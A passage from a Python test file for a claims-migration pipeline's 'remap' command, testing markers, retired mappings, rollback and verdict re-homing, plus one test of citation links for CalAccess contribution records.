    """A question a migration adds has no maps_from, so its retired entry has no mapped_from —
    and its claim, researched on its own id afterwards, was kept only if it had one. A live
    run has 8 such questions: after one new pair they read as stranded, and --archive-stranded
    archived all 8 with 90 verdicts. In a retired file every question with no new move keeps
    the claim on its own id."""
    import json

    from vgpipe import cli, judgments

    _remap_run(tmp_path, ROTATE)
    qpath = tmp_path / "questions.json"
    qs = json.loads(qpath.read_text())
    qs.append({"id": "q5", "text": "new q5", "claim_type": "mechanical"})    # added, no mapping
    qpath.write_text(json.dumps(qs, indent=1))
    cli.remap(data=tmp_path, apply=True)
    a = src(**ONLY_A)
    _claim_file(tmp_path, "q5", a, answer="researched after")                # on its own id
    judgments.record(tmp_path, "q5", a.sid, "supports", "judged on q5")

    qs = json.loads(qpath.read_text())
    qs.append({"id": "q4", "text": "new q4", "claim_type": "mechanical", "maps_from": "q3"})
    qpath.write_text(json.dumps(qs, indent=1))
    capsys.readouterr()
    cli.remap(data=tmp_path)
    out = " ".join(re.sub(r"\x1b\[[0-9;]*m", "", capsys.readouterr().out).split())
    assert "nothing maps to" not in out, out
    assert "1 question(s) with no prior research: q3 " in out, "q3 only — q5 keeps its claim"

    cli.remap(data=tmp_path, apply=True, archive_stranded=True)
    assert _answers(tmp_path)["q5"] == "researched after"
    assert not (tmp_path / "claims-archive").exists(), "nothing was stranded"
    assert judgments.load(tmp_path, "q5")[a.sid].note == "judged on q5", "nor its verdicts"


def test_an_identity_rewording_after_a_retire_goes_through(tmp_path, capsys):
    """Identity pairs aren't part of the mapping state, so declaring one to adopt a reworded
    question — on a question whose retired entry is an identity pair, or one with no mapping at
    all — hashed to the recorded state and was refused as already applied, with deleting a
    marker line the only way through. It moves nothing, so there is nothing to re-apply; a
    restored move alongside it is still refused."""
    import json

    import typer

    from vgpipe import cli

    _remap_run(tmp_path, [("q1", "q2"), ("q2", "q1"), ("q3", "q3")])
    qpath = tmp_path / "questions.json"
    qs = json.loads(qpath.read_text())
    qs.append({"id": "q4", "text": "new q4", "claim_type": "mechanical"})
    qpath.write_text(json.dumps(qs, indent=1))
    cli.remap(data=tmp_path, apply=True)
    once = _answers(tmp_path)
    _claim_file(tmp_path, "q4", answer="researched on q4")
    marker = (tmp_path / ".remap-applied").read_text()

    qs = json.loads(qpath.read_text())
    for q in qs:
        if q["id"] in ("q3", "q4"):
            q["text"] = f"reworded {q['id']}"
            q["maps_from"] = q["id"]
    qpath.write_text(json.dumps(qs, indent=1))
    cli.remap(data=tmp_path, apply=True)
    for qid in ("q3", "q4"):
        claim = json.loads((tmp_path / "claims" / f"{qid}.json").read_text())
        assert claim["question"] == f"reworded {qid}", qid
    assert {k: v for k, v in _answers(tmp_path).items() if k != "q4"} == once
    assert (tmp_path / ".remap-applied").read_text() == marker, "an identity apply records nothing"
    assert not [q for q in json.loads(qpath.read_text()) if q.get("maps_from")], "and retires"

    # a rewording declared beside a restored half of the retired swap is still a re-apply
    qs = json.loads(qpath.read_text())
    for q in qs:
        if q["id"] == "q1":
            q["maps_from"] = q.pop("mapped_from")
        if q["id"] == "q3":
            q["maps_from"] = "q3"
    qpath.write_text(json.dumps(qs, indent=1))
    with pytest.raises(typer.Exit):
        cli.remap(data=tmp_path, apply=True)
    assert "already been applied" in capsys.readouterr().out


def test_a_swap_restored_after_an_identity_rewording_is_still_refused(tmp_path, capsys):
    """An identity pair declared over a question whose retired entry was a move drops that move
    from the mapping state. Without a marker line for the new state, restoring one swap of the
    same migration hashed to nothing recorded and moved its two claims onto each other's
    questions. An identity apply that changes the state records it."""
    import json

    import typer

    from vgpipe import cli

    (tmp_path / "claims").mkdir()
    for qid in ("q1", "q2", "q3", "q4"):
        (tmp_path / "claims" / f"{qid}.json").write_text(json.dumps(
            {"question_id": qid, "question": f"old {qid}", "answer": f"about {qid}",
             "sources": []}))
    _write_mapping(tmp_path, [("q1", "q2"), ("q2", "q1"), ("q3", "q4"), ("q4", "q3")])
    cli.remap(data=tmp_path, apply=True)
    qpath = tmp_path / "questions.json"
    qs = json.loads(qpath.read_text())
    for q in qs:
        if q["id"] == "q3":                           # reword q3, keeping its claim
            q["text"], q["maps_from"] = "reworded q3", "q3"
    qpath.write_text(json.dumps(qs, indent=1))
    cli.remap(data=tmp_path, apply=True)
    settled = _answers(tmp_path)

    qs = json.loads(qpath.read_text())
    for q in qs:
        if q["id"] in ("q1", "q2"):                   # a partial checkout of the first file
            q["maps_from"] = q.pop("mapped_from")
    qpath.write_text(json.dumps(qs, indent=1))
    capsys.readouterr()
    with pytest.raises(typer.Exit):
        cli.remap(data=tmp_path, apply=True)
    assert "already been applied" in capsys.readouterr().out
    assert _answers(tmp_path) == settled, "the swap moved claims onto each other's questions"


def test_an_older_retired_questions_json_put_back_is_refused(tmp_path, capsys):
    """After a later apply, the older retired questions.json put back has nothing pending, so
    remap said "nothing to remap" and exited 0 — leaving the older question set over claims a
    later migration moved. Its mapping state is in the marker with a later one after it."""
    import json

    import typer

    from vgpipe import cli

    _remap_run(tmp_path, ROTATE)
    cli.remap(data=tmp_path, apply=True)
    qpath = tmp_path / "questions.json"
    older = qpath.read_text()
    qs = json.loads(older)
    qs.append({"id": "q4", "text": "new q4", "claim_type": "mechanical", "maps_from": "q3"})
    qpath.write_text(json.dumps(qs, indent=1))
    cli.remap(data=tmp_path, apply=True)
    current = qpath.read_text()
    moved = _answers(tmp_path)

    qpath.write_text(older)
    capsys.readouterr()
    for flags in ({}, {"apply": True}, {"apply": True, "archive_stranded": True}):
        with pytest.raises(typer.Exit) as exc:
            cli.remap(data=tmp_path, **flags)
        assert exc.value.exit_code == 1, flags
        out = " ".join(capsys.readouterr().out.split())
        assert "older copy" in out and "nothing to remap" not in out, (flags, out)
        assert "--mark-applied" in out, "names the way out if this IS the current file"
        assert _answers(tmp_path) == moved and qpath.read_text() == older, flags

    # an identity rewording must not carry the older file through, nor record it as current
    marker = (tmp_path / ".remap-applied").read_text()
    qs = json.loads(older)
    qs[0]["maps_from"] = qs[0]["id"]
    qpath.write_text(json.dumps(qs, indent=1))
    for flags in ({"apply": True, "archive_stranded": True}, {"mark_applied": True}):
        with pytest.raises(typer.Exit):
            cli.remap(data=tmp_path, **flags)
        assert "older copy" in " ".join(capsys.readouterr().out.split()), flags
        assert _answers(tmp_path) == moved, flags
        assert (tmp_path / ".remap-applied").read_text() == marker, flags

    qpath.write_text(current)
    cli.remap(data=tmp_path)
    assert "nothing to remap" in capsys.readouterr().out, "the current file is fine"


def test_a_dropped_question_is_refused_as_an_older_state_and_mark_applied_is_the_way_out(
        tmp_path, capsys):
    """Dropping the question the latest migration mapped returns the state to an earlier line,
    which reads exactly as an older file put back — so remap refuses. It can't tell the two
    apart, so --mark-applied records the current file as current on the operator's word, which
    beats hand-editing the marker."""
    import json

    import typer

    from vgpipe import cli

    _remap_run(tmp_path, ROTATE)
    cli.remap(data=tmp_path, apply=True)
    qpath = tmp_path / "questions.json"
    qs = json.loads(qpath.read_text())
    qs.append({"id": "q4", "text": "new q4", "claim_type": "mechanical", "maps_from": "q3"})
    qpath.write_text(json.dumps(qs, indent=1))
    cli.remap(data=tmp_path, apply=True)
    qpath.write_text(json.dumps([q for q in json.loads(qpath.read_text()) if q["id"] != "q4"],
                                indent=1))
    capsys.readouterr()
    with pytest.raises(typer.Exit):
        cli.remap(data=tmp_path)
    assert "older copy" in capsys.readouterr().out

    cli.remap(data=tmp_path, mark_applied=True)
    assert "as the current mapping state" in " ".join(capsys.readouterr().out.split())
    cli.remap(data=tmp_path)
    assert "nothing to remap" in capsys.readouterr().out


def test_rewording_both_halves_of_a_swap_keeps_the_swap_recorded(tmp_path, capsys):
    """Retiring an identity pair overwrote the move a question's mapped_from recorded. Reword
    both halves of a swap and the swap was gone from the file and the state; restoring half of
    it later hashed to nothing recorded and moved its claim with exit 0. An identity pair keeps
    the recorded move, so rewording never changes the state."""
    import json

    import typer

    from vgpipe import cli

    (tmp_path / "claims").mkdir()
    for qid, answer in (("q1", "A"), ("q2", "B")):
        (tmp_path / "claims" / f"{qid}.json").write_text(json.dumps(
            {"question_id": qid, "question": f"old {qid}", "answer": answer, "sources": []}))
    _write_mapping(tmp_path, [("q1", "q2"), ("q2", "q1")])
    cli.remap(data=tmp_path, apply=True)
    marker = (tmp_path / ".remap-applied").read_text()
    qpath = tmp_path / "questions.json"
    for qid in ("q1", "q2"):
        qs = json.loads(qpath.read_text())
        for q in qs:
            if q["id"] == qid:
                q["text"], q["maps_from"] = f"reworded {qid}", qid
        qpath.write_text(json.dumps(qs, indent=1))
        cli.remap(data=tmp_path, apply=True)
    assert {q["id"]: q["mapped_from"] for q in json.loads(qpath.read_text())} == \
        {"q1": "q2", "q2": "q1"}, "the swap is still on record"
    assert (tmp_path / ".remap-applied").read_text() == marker, "rewording records nothing"
    settled = _answers(tmp_path)

    qs = json.loads(qpath.read_text())
    qs[0]["maps_from"] = qs[0].pop("mapped_from")            # half of the swap restored
    qpath.write_text(json.dumps(qs, indent=1))
    capsys.readouterr()
    with pytest.raises(typer.Exit):
        cli.remap(data=tmp_path, apply=True, archive_stranded=True)
    assert "already been applied" in capsys.readouterr().out
    assert _answers(tmp_path) == settled


def test_a_run_with_a_marker_keeps_its_claims_even_when_no_entry_is_retired(tmp_path):
    """A new mapping that rewrites every retired entry (renamed questions, with maps_from and no
    mapped_from) left nothing marking the run as migrated, so it fell back to reading a whole
    migration and stranded every unmapped claim — the claims of questions added since. A
    marker line proves the run migrated as well as a mapped_from does."""
    import json

    from vgpipe import cli

    _remap_run(tmp_path, [("q3", "q1"), ("q2", "q2")])        # q1's claim to q3
    qpath = tmp_path / "questions.json"
    qs = json.loads(qpath.read_text())
    qs.append({"id": "q4", "text": "new q4", "claim_type": "mechanical"})
    qpath.write_text(json.dumps(qs, indent=1))
    (tmp_path / "claims" / "q3.json").unlink()                  # nothing on q3 to collide with
    cli.remap(data=tmp_path, apply=True)
    _claim_file(tmp_path, "q4", answer="researched on q4")
    qpath.write_text(json.dumps([                               # entries rewritten, not edited
        {"id": "q6", "text": "renamed q3", "claim_type": "mechanical", "maps_from": "q3"},
        {"id": "q5", "text": "renamed q2", "claim_type": "mechanical", "maps_from": "q2"},
        {"id": "q4", "text": "new q4", "claim_type": "mechanical"}], indent=1))
    cli.remap(data=tmp_path, apply=True, archive_stranded=True)
    assert _answers(tmp_path)["q4"] == "researched on q4"
    assert not (tmp_path / "claims-archive").exists()


def test_a_new_pair_does_not_wave_through_a_mapping_retired_elsewhere(tmp_path, capsys):
    """The check that the claim files disprove a retired mapping ran only with nothing pending,
    so adding any new pair to a questions.json retired in another checkout let it through: the
    research the retired migration should have moved was listed as stranded, and archived."""
    import typer

    from vgpipe import cli

    here, elsewhere = tmp_path / "here", tmp_path / "elsewhere"
    for run in (here, elsewhere):
        run.mkdir()
        _remap_run(run, RENAME)                     # q2 retires to q2a
    cli.remap(data=elsewhere, apply=True)
    import json
    qs = json.loads((elsewhere / "questions.json").read_text())
    qs.append({"id": "q7", "text": "new q7", "claim_type": "mechanical", "maps_from": "q6"})
    (here / "questions.json").write_text(json.dumps(qs, indent=1))
    before = _tree(here / "claims")
    capsys.readouterr()
    for flags in ({}, {"apply": True, "archive_stranded": True}):
        with pytest.raises(typer.Exit):
            cli.remap(data=here, **flags)
        assert "retired somewhere else" in " ".join(capsys.readouterr().out.split()), flags
        assert _tree(here / "claims") == before, flags


def _swapped_and_retired(tmp_path):
    """q1 and q2 swapped and retired: q1.mapped_from = q2, q2.mapped_from = q1, so each id is also
    the other question's retained old id — the shape of a live run, where retained entries
    name 26 of its 38 current ids."""
    import json

    from vgpipe import cli

    (tmp_path / "claims").mkdir()
    for qid, answer in (("q1", "A"), ("q2", "B"), ("q3", "C")):
        (tmp_path / "claims" / f"{qid}.json").write_text(json.dumps(
            {"question_id": qid, "question": f"new {qid}", "answer": answer, "sources": []}))
    _write_mapping(tmp_path, [("q1", "q2"), ("q2", "q1"), ("q3", "q3")])
    cli.remap(data=tmp_path, apply=True)
    return json.loads((tmp_path / "questions.json").read_text())


def test_renaming_or_dropping_a_question_is_not_read_as_a_mapping_retired_elsewhere(tmp_path,
                                                                                     capsys):
    """A retained mapped_from names an id from an earlier id space. Rename q2 (q5 maps_from q2)
    or drop it, and q2 is no current question while q1.mapped_from = q2 and q2.json exists —
    which the retired-mapping check read as "retired somewhere else", a refusal nothing could
    get past. That file is q2's own research, and in the rename the pending move's source. A
    move that never ran leaves its destination empty too; here q1 has its claim."""
    import json

    from vgpipe import cli

    qs = _swapped_and_retired(tmp_path)
    qpath = tmp_path / "questions.json"
    renamed = [dict(q, id="q5", maps_from="q2") if q["id"] == "q2" else q for q in qs]
    for q in renamed:
        if q["id"] == "q5":
            q.pop("mapped_from")
    qpath.write_text(json.dumps(renamed, indent=1))
    capsys.readouterr()
    cli.remap(data=tmp_path, apply=True)
    assert "retired somewhere else" not in capsys.readouterr().out
    assert _answers(tmp_path) == {"q1": "B", "q3": "C", "q5": "A"}, "the rename moved q2's claim"

    tmp_path2 = tmp_path / "drop"
    tmp_path2.mkdir()
    qs = _swapped_and_retired(tmp_path2)
    dropped = [q for q in qs if q["id"] != "q2"]
    for extra in ([], [{"id": "q7", "text": "new q7", "claim_type": "mechanical",
                        "maps_from": "q6"}]):
        (tmp_path2 / "questions.json").write_text(json.dumps(dropped + extra, indent=1))
        capsys.readouterr()
        cli.remap(data=tmp_path2)
        out = " ".join(capsys.readouterr().out.split())
        assert "retired somewhere else" not in out, (extra, out)


def test_a_different_question_at_an_existing_id_says_it_keeps_the_old_claim(tmp_path, capsys):
    """Put a different question at q3, with no maps_from, and q3's old claim stayed attached to
    it with no mention in the dry run — before retirement it was listed as stranded. The dry
    run names every kept claim whose question now reads differently."""
    import json

    from vgpipe import cli

    qs = _swapped_and_retired(tmp_path)
    for q in qs:
        if q["id"] == "q3":
            q["text"] = "an entirely different question"
    qs.append({"id": "q4", "text": "new q4", "claim_type": "mechanical", "maps_from": "q9"})
    (tmp_path / "questions.json").write_text(json.dumps(qs, indent=1))
    capsys.readouterr()
    cli.remap(data=tmp_path)
    out = " ".join(re.sub(r"\x1b\[[0-9;]*m", "", capsys.readouterr().out).split())
    assert "1 claim(s) kept on their ids although the question there now reads differently: q3" \
        in out, out
    assert "reads differently: q3 —" in out, "only q3: q1 and q2 ask what the template asks"


def test_two_questions_sharing_an_id_are_refused_before_anything_moves(tmp_path):
    """Two old ids mapped onto one question id passed the dry run, then crashed the apply with a
    traceback from rehome() after the backup and the archive had run."""
    import typer

    from vgpipe import cli

    _remap_run(tmp_path, [("q2", "q1"), ("q2", "q3")])
    before = _tree(tmp_path)
    for flags in ({}, {"apply": True}, {"apply": True, "archive_stranded": True}):
        with pytest.raises(typer.Exit) as exc:
            cli.remap(data=tmp_path, **flags)
        assert exc.value.exit_code == 1, flags
        assert _tree(tmp_path) == before, flags


@pytest.mark.parametrize("fails", [
    pytest.param("before", id="before-the-transaction"),
    pytest.param("moving", id="while-moving-claims"),
    pytest.param("killed", id="killed-before-commit"),
])
def test_a_failed_remap_never_leaves_claims_and_marker_disagreeing(tmp_path, monkeypatch,
                                                                 fails):
    """The guard exists to recognize claims on the new ids with no marker. The marker was once
    written after verdicts were re-homed, so anything failing in between left exactly that state;
    it then went down before the first move, which a failed apply left behind to refuse the
    retry. Now claims, marker and verdicts move in one transaction: a failure puts all three
    back, and a kill leaves a backup that stops remap until `--rollback` puts all three back.
    The retired mapping is a fourth: kept outside the transaction, a failure could leave claims
    moved with maps_from pending, or a retired mapping over claims that never moved."""
    import typer

    from vgpipe import cli, judgments

    _remap_run(tmp_path, ROTATE)
    before = _answers(tmp_path)
    marker = tmp_path / ".remap-applied"
    qpath = tmp_path / "questions.json"
    declared = qpath.read_text()
    if fails == "before":
        def boom(*_a, **_k):
            raise RuntimeError("rehome died")

        monkeypatch.setattr(judgments, "rehome", boom)
        expected = RuntimeError
    elif fails == "moving":
        real = Path.write_text

        def full_disk(self, *a, **kw):
            if self.parent.name == "claims":
                raise OSError(28, "No space left on device")
            return real(self, *a, **kw)

        monkeypatch.setattr(Path, "write_text", full_disk)
        expected = typer.Exit
    else:
        real_replace = judgments.os.replace

        def killed_at_commit(a, b):
            if Path(b).name == "judgments-backup.discard":
                raise KeyboardInterrupt
            real_replace(a, b)

        monkeypatch.setattr(judgments.os, "replace", killed_at_commit)
        expected = KeyboardInterrupt
    with pytest.raises(expected):
        cli.remap(data=tmp_path, apply=True)
    monkeypatch.undo()

    if fails == "killed":
        assert marker.exists() and _answers(tmp_path) != before, "claims and marker had moved"
        assert "maps_from" not in qpath.read_text(), "and the mapping had retired"
        with pytest.raises(typer.Exit):
            cli.remap(data=tmp_path, apply=True)      # refused: the backup says it was cut off
        cli.show_judgments(data=tmp_path, rollback=True)
    assert _answers(tmp_path) == before and not marker.exists(), "all of it, or none of it"
    assert qpath.read_text() == declared, "the mapping is pending again with its claims"
    cli.remap(data=tmp_path, apply=True)
    assert marker.exists() and _answers(tmp_path) != before
    assert "maps_from" not in qpath.read_text()


def test_mark_applied_protects_a_run_remapped_before_the_guard(tmp_path):
    """data/ and data/<candidate> were remapped before the guard existed: claims on the new ids,
    maps_from unchanged, no marker — so a dry run proposed the whole migration again and --apply
    would have performed it. --mark-applied takes the operator's word that the migration ran and
    does what a finished apply does, moving nothing: it records the marker and retires maps_from
    as mapped_from. From then on there is nothing to remap, and putting the old file back is
    refused. Driven through the CLI so the command CLAUDE.md tells the operator to run is the
    one tested."""
    import json

    from typer.testing import CliRunner

    from vgpipe import cli

    _applied_before_the_guard(tmp_path, ROTATE)
    migrated = _answers(tmp_path)
    qpath = tmp_path / "questions.json"
    declared = qpath.read_text()
    runner = CliRunner()

    unguarded = runner.invoke(cli.app, ["remap", "--data", str(tmp_path)])
    assert "dry run; pass --apply" in unguarded.output, "unmarked, the moves are proposed again"

    marked = runner.invoke(cli.app, ["remap", "--data", str(tmp_path), "--mark-applied"])
    assert marked.exit_code == 0, marked.output
    assert "tracked in git" in " ".join(marked.output.split()), "says to commit it with claims"
    assert (tmp_path / ".remap-applied").exists()
    assert _answers(tmp_path) == migrated, "marking moves nothing"
    retired = json.loads(qpath.read_text())
    assert not [q for q in retired if "maps_from" in q]
    assert {q["id"]: q["mapped_from"] for q in retired} == {"q2": "q1", "q3": "q2", "q1": "q3"}

    for args in ([], ["--apply"], ["--apply", "--archive-stranded"]):
        r = runner.invoke(cli.app, ["remap", "--data", str(tmp_path), *args])
        assert r.exit_code == 0 and "nothing to remap" in r.output, (args, r.output)
        assert _answers(tmp_path) == migrated, f"remap {args} must move nothing"
        assert not (tmp_path / "claims-archive").exists(), f"remap {args} archived claims"

    again = runner.invoke(cli.app, ["remap", "--data", str(tmp_path), "--mark-applied"])
    assert again.exit_code == 0 and "already retired" in again.output, again.output
    assert json.loads(qpath.read_text()) == retired

    # the marker is the second guard: the pre-mark file put back — or put back and then edited
    # in a way that moves nothing — is refused, not re-applied
    edited = list(reversed(json.loads(declared)))
    edited.append({"id": "q4", "text": "new q4", "claim_type": "mechanical", "maps_from": None})
    for text in (declared, json.dumps(edited)):
        qpath.write_text(text)
        for args in ([], ["--apply"]):
            r = runner.invoke(cli.app, ["remap", "--data", str(tmp_path), *args])
            assert r.exit_code == 1 and "already been applied" in r.output, (args, r.output)
            assert _answers(tmp_path) == migrated, f"remap {args} moved claims"


def test_mark_applied_refuses_what_it_cannot_assert(tmp_path, capsys):
    """--mark-applied takes the operator's word that the claims sit on the new ids, so it must
    not stretch that word. It moves nothing, so --apply alongside it is a contradiction; it needs
    a mapping to mark; and a marker for a DIFFERENT mapping means this run was remapped under the
    guard and the current maps_from never went through it — marking that would silently skip a
    pending migration rather than record a finished one. That refusal must not send the operator
    to --apply either: they believe the move happened, and if so, applying repeats it."""
    import json

    import typer

    from vgpipe import cli

    _remap_run(tmp_path, ROTATE)
    original = _answers(tmp_path)
    marker = tmp_path / ".remap-applied"
    qpath = tmp_path / "questions.json"
    declared = qpath.read_text()

    for flags in ({"apply": True}, {"archive_stranded": True},
                  {"apply": True, "archive_stranded": True}):
        with pytest.raises(typer.Exit) as exc:
            cli.remap(data=tmp_path, mark_applied=True, **flags)
        assert exc.value.exit_code == 1, flags
        assert _answers(tmp_path) == original and not marker.exists(), flags
        assert not (tmp_path / "claims-backup").exists(), "refused before anything was touched"
        assert qpath.read_text() == declared, "a refused mark retires nothing"

    # some earlier mapping, applied under the guard; an empty file, whose meaning is unknown; a
    # hand edit that left Rich markup in it, which must not crash the refusal
    capsys.readouterr()
    for recorded in ("0123456789ab", "", "[/]"):
        marker.write_text(recorded)
        with pytest.raises(typer.Exit) as exc:
            cli.remap(data=tmp_path, mark_applied=True)
        assert exc.value.exit_code == 1, repr(recorded)
        assert marker.read_text() == recorded, "an existing marker is never overwritten"
        assert qpath.read_text() == declared, "a refused mark retires nothing"
        out = " ".join(capsys.readouterr().out.split())
        assert "--apply" not in out, "a refused mark never points at --apply"
    marker.unlink()

    (tmp_path / "questions.json").write_text(json.dumps(
        [{"id": "q1", "text": "new q1", "claim_type": "mechanical"}]))
    with pytest.raises(typer.Exit) as exc:
        cli.remap(data=tmp_path, mark_applied=True)
    assert exc.value.exit_code == 1
    assert not marker.exists(), "no maps_from, nothing to mark"


# q2 is renamed to an id the template did not have before: the shape of the real runs, whose
# mappings retire q2, q3 and q5. Unlike a pure rotation, this one leaves a trace on disk.
RENAME = [("q1", "q1"), ("q2a", "q2"), ("q3", "q3")]


def test_mark_applied_refuses_when_the_claims_show_the_migration_never_ran(tmp_path, capsys):
    """The operator's word decides only where the files can't: they can disprove a migration,
    never prove one. A claim file still on a retired id (q2, when no question is q2 any more)
    means the move never ran — a committed data/<candidate> looked exactly like this while its
    migrated claims existed only as uncommitted changes in one checkout. So does a run with no
    claims at all. Marking either would block the migration it still needs."""
    import shutil

    import typer

    from vgpipe import cli

    _remap_run(tmp_path, RENAME)
    marker = tmp_path / ".remap-applied"
    qpath = tmp_path / "questions.json"
    declared = qpath.read_text()
    # a stale duplicate too: the retired-id refusal must win over the loader's duplicate error
    (tmp_path / "claims" / "stale.json").write_text(
        (tmp_path / "claims" / "q1.json").read_text())
    with pytest.raises(typer.Exit) as exc:
        cli.remap(data=tmp_path, mark_applied=True)
    assert exc.value.exit_code == 1
    assert "q2" in capsys.readouterr().out
    assert not marker.exists(), "an unmigrated run is not marked"
    assert qpath.read_text() == declared, "nor is its mapping retired"
    (tmp_path / "claims" / "stale.json").unlink()

    shutil.rmtree(tmp_path / "claims")
    # no claims dir at all; an empty one; one whose only file parses to no claims
    for contents in (None, {}, {"q1.json": "[]"}):
        if contents is not None:
            (tmp_path / "claims").mkdir(exist_ok=True)
            for name, text in contents.items():
                (tmp_path / "claims" / name).write_text(text)
        with pytest.raises(typer.Exit) as exc:
            cli.remap(data=tmp_path, mark_applied=True)
        assert exc.value.exit_code == 1, contents
        assert not marker.exists(), "a run with no claims has migrated nothing"
        assert qpath.read_text() == declared
    shutil.rmtree(tmp_path / "claims")

    # the same run migrated before the guard: marks, and retires the mapping
    _applied_before_the_guard(tmp_path, RENAME)
    cli.remap(data=tmp_path, mark_applied=True)
    recorded = marker.read_text()
    retired = qpath.read_text()
    assert "maps_from" not in retired

    # re-marking is a no-op, so the checks that guard a write can't fail it: here, no claims
    shutil.rmtree(tmp_path / "claims")
    (tmp_path / "claims").mkdir()
    cli.remap(data=tmp_path, mark_applied=True)
    assert "already retired" in capsys.readouterr().out
    assert marker.read_text() == recorded and qpath.read_text() == retired
    # but a claim file back on a retired id disproves the move, retired mapping or not
    (tmp_path / "claims" / "q2.json").write_text("[]")
    with pytest.raises(typer.Exit):
        cli.remap(data=tmp_path, mark_applied=True)
    assert marker.read_text() == recorded and qpath.read_text() == retired


def test_mark_applied_retires_a_mapping_the_marker_already_records(tmp_path, capsys):
    """A marker and a live maps_from together mean an apply recorded this mapping and never
    retired it: one that stopped after the move, or one run by remap before it retired
    mappings. Once the claims are on the new ids, --mark-applied is how the mapping retires —
    the marker needs no second line, and the checks that can disprove the move still apply,
    because this now writes questions.json."""
    import json

    import typer

    from vgpipe import cli

    marker = tmp_path / ".remap-applied"
    qpath = tmp_path / "questions.json"
    _remap_run(tmp_path, RENAME)
    cli.remap(data=tmp_path, apply=True)
    recorded = marker.read_text()
    _write_mapping(tmp_path, RENAME)             # the apply that recorded but never retired
    declared = qpath.read_text()

    # a claim file back on a retired id disproves the move: refused, nothing retired
    (tmp_path / "claims" / "q2.json").write_text("[]")
    with pytest.raises(typer.Exit):
        cli.remap(data=tmp_path, mark_applied=True)
    assert qpath.read_text() == declared and marker.read_text() == recorded
    (tmp_path / "claims" / "q2.json").unlink()

    capsys.readouterr()
    cli.remap(data=tmp_path, mark_applied=True)
    assert "already recorded" in capsys.readouterr().out
    assert marker.read_text() == recorded, "one line per mapping"
    assert {q["id"]: q.get("mapped_from") for q in json.loads(qpath.read_text())} == \
        {"q1": "q1", "q2a": "q2", "q3": "q3"}


def test_every_listed_contribution_names_a_filing_to_cite(tmp_path):
    """The listing's whole purpose is to hand off to a citation: "cite the filing page, not this
    table". Collapsing restatements dropped FILING_ID, so every row printed
    `filingid=&amendid=0` — a dead link that looks like the researcher's mistake. A collapsed
    row must still name a filing, and the earliest is where the gift was first reported."""
    import zipfile

    from vgpipe import calaccess

    (tmp_path / "cache" / "calaccess").mkdir(parents=True, exist_ok=True)
    # one gift, restated under three filing ids with a stable TRAN_ID
    receipts = ('FILING_ID\tAMEND_ID\tTRAN_ID\tLINE_ITEM\tCTRIB_NAML\tCTRIB_NAMF\tCTRIB_EMP'
                '\tCTRIB_OCC\tRCPT_DATE\tAMOUNT\tFORM_TYPE\n'
                '9990013\t0\t20000001\t1\tWhitfield\tTaylor\t\tInvestor'
                '\t3/9/2026 12:00:00 AM\t85000\tF496P3\n'
                '9990012\t0\t20000001\t1\tWhitfield\tTaylor\t\tInvestor'
                '\t3/9/2026 12:00:00 AM\t85000\tF496P3\n'
                '9990014\t0\t20000001\t1\tWhitfield\tTaylor\t\tInvestor'
                '\t3/9/2026 12:00:00 AM\t85000\tA\n')
    filings = ('FILER_ID\tFILING_ID\tFORM_ID\tFILING_DATE\n'
               '9990011\t9990013\tF496\t3/10/2026 12:00:00 AM\n'
               '9990011\t9990012\tF496\t3/10/2026 12:00:00 AM\n'
               '9990011\t9990014\tF460\t4/30/2026 12:00:00 AM\n')
    with zipfile.ZipFile(tmp_path / "cache" / "calaccess" / "dbwebexport.zip", "w") as zf:
        zf.writestr("CalAccess/DATA/RCPT_CD.TSV", receipts)
        zf.writestr("CalAccess/DATA/FILER_FILINGS_CD.TSV", filings)
    calaccess.build(tmp_path)

    rows = calaccess.contributions_to(tmp_path, "9990011", top=10)
    assert len(rows) == 1, "one gift restated three times is one gift"
    c = rows[0]
    assert c.amount == 85000.0
    assert str(c.filing_id).strip(), "a collapsed row must still name a filing"
    assert c.filing_id == "9990012", "cite the earliest filing in the chain"
    assert f"filingid={c.filing_id}" in c.cite_url
    assert "filingid=&" not in c.cite_url
    assert c.filings == 3, "say how many filings restated it"


def test_moving_a_claim_does_not_orphan_its_verdicts(tmp_path):
    """I told two sessions "judgments are keyed by source id, so verdicts survive" a remap. The
    entries are; the FILES are named by question id. So a claim moving from q21 to q18 left its
    verdicts in q21.json and q18 found none — 181 judged sources rendered `unreviewed` across
    one run. It fails in the worst direction: unreviewed reads as "not yet judged" rather than
    "lost", so a damaged run looks merely incomplete."""
    import json

    from vgpipe import judgments

    s1, s2 = src(), src(url="https://sacbee.com/b", publisher="Sacramento Bee")
    for s in (s1, s2):
        _cache_judged_page(tmp_path, s.url)
    judgments.record(tmp_path, "q21", s1.sid, "supports", "climate verdict")
    judgments.record(tmp_path, "q21", s2.sid, "topic_only", "second climate verdict")

    # the claim has moved to q18; a fresh verifier has since written into q21 for a new claim
    moved = Claim(question_id="q18", question="climate", answer="a", sources=[s1, s2])
    other = Claim(question_id="q21", question="homelessness", answer="b", sources=[])

    judgments.apply_to(moved, tmp_path, cache_root=tmp_path)
    assert moved.sources[0].verification.support == "unreviewed", "the bug being fixed"

    # the mapping remap hands over: q21 is held by another claim now, so nothing in the data
    # alone says its verdicts moved rather than lapsed (see the --repair tests below)
    rehomed, orphaned, touched, _ = judgments.rehome(tmp_path, [moved, other], {"q21": "q18"})
    assert rehomed == 2 and orphaned == 0 and touched == ["q18"]

    judgments.apply_to(moved, tmp_path, cache_root=tmp_path)
    assert [s.verification.support for s in moved.sources] == ["supports", "topic_only"]
    assert moved.sources[0].verification.support_note == "climate verdict"
    # q21's shard is gone rather than holding another question's verdicts
    assert not judgments.path_for(tmp_path, "q21").exists()


def test_rehoming_reports_verdicts_that_belong_to_nothing(tmp_path):
    """A verdict whose sid no longer matches any cited source is not re-homed and not silently
    dropped: it means the citation was retracted or changed, which the operator should see."""
    from vgpipe import judgments

    live = src()
    judgments.record(tmp_path, "q1", live.sid, "supports", "still cited")
    judgments.record(tmp_path, "q1", "deadbeef1234", "supports", "citation since changed")

    claim = Claim(question_id="q1", question="?", answer="a", sources=[live])
    rehomed, orphaned, _, _ = judgments.rehome(tmp_path, [claim])
    assert rehomed == 1 and orphaned == 1
    # Out of the live shard, but kept: it was deleted outright, which makes restoring the
    # citation (or the archived claim that made it) a paid re-run of the judgment pass.
    assert set(judgments.load(tmp_path, "q1")) == {live.sid}
    (kept,) = (judgments.archive_dir(tmp_path)).iterdir()
    assert json.loads((kept / "q1.json").read_text())[0]["note"] == "citation since changed"


def _shards(root: Path) -> dict[str, bytes]:
    return {p.name: p.read_bytes() for p in sorted((root / "judgments").iterdir())}


def _claim_file(root: Path, qid: str, *sources, answer="a"):
    (root / "claims").mkdir(exist_ok=True)
